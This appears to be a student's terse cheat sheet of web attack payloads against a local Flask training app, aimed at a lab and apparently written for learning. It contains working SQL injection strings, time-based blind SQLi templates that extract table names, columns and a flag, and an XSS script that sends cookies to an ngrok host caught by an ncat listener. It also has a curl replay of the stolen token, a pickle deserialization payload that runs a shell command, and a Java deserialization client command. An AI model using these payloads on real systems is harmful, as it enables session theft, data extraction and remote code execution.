Flask
SQL
----------
' or 1=1; -- 


XSS
---------
ncat -klnvp 9000
ngrok http 9000
<script>document.write('<img src="http://340b-2406-3003-2077-4ea9-85b2-4692-1458-96f8.ngrok.io?cookie='+btoa(document.cookie)+'" />');</script>
curl -H "Cookie: token=8abae5d8bc89622b6bf5a76c948312f2" http://127.0.0.1:5000/XSS/admin


SQL Timing Based
--------------
https://www.youtube.com/watch?v=DYLDG_2Vs3E
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
"' or ((SELECT hex(substr(table_name,{},1)) FROM information_schema.tables limit 1 offset 0)=hex('{}') and 1=1-SLEEP(2)) -- ".format(len(known_data)+1, x)
"' or ((SELECT hex(substr(column_name,{},1)) FROM information_schema.columns where table_name = 'supersecrettable' limit 1 offset 0)=hex('{}') and 1=1-SLEEP(2)) -- "
"user_name": "' or ((SELECT hex(substr(flag,{},1)) FROM supersecrettable limit 1 offset 0)=hex('{}') and 1=1-SLEEP(2)) -- "

XML Blind injection
----------------------------
https://www.youtube.com/watch?v=ySJwlMsFbco
Refer to script


XXE injection
------------------------
https://www.youtube.com/watch?v=kiGoOuuXWFI


Pickle Insecure Deserialization
---------------------------
Refer to script
ncat -klnvp 9000
curl -d "function=decode&input=\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x13ncat 127.0.0.1 9000\x94\x85\x94R\x94." http://127.0.0.1:5000/INSEC/


Java Insecure Deserialization
-------------------------
cd C:\Program Files\Java\jdk-14.0.2\bin\
java.exe -Dfile.encoding=Cp1252 -classpath "D:\GitAssignment\Flask\test\bin;D:\GitAssignment\Flask\test\lib\commons-collections4-4.0.jar" test.Client


